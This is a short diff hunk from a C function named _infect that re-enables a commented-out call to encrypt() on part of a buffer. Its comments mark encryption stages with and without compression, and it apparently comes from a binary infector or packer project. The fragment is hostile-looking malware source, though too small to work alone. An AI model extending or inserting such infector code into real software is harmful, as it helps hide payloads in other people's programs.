@@ -116,7 +116,7 @@ static int _infect(char **s, size_t *n, struct s_infect_params p, struct s_opt o
 	bool compressed;
 	//---------- z2 (encryption without compression) -------------
 	compressed = FALSE;
-	//encrypt(((*s) + pos + p.cmpr_off), p.cmpr_len, (uint32_t*)key, &compressed);
+	encrypt(((*s) + pos + p.cmpr_off), p.cmpr_len, (uint32_t*)key, &compressed);
 	//---------- z3 (encryption with compression) ----------------
 	compressed = TRUE;
 	uint64_t changed = encrypt(((*s) + pos + p.crypt_off), p.crypt_len, (uint32_t*)key, &compressed);
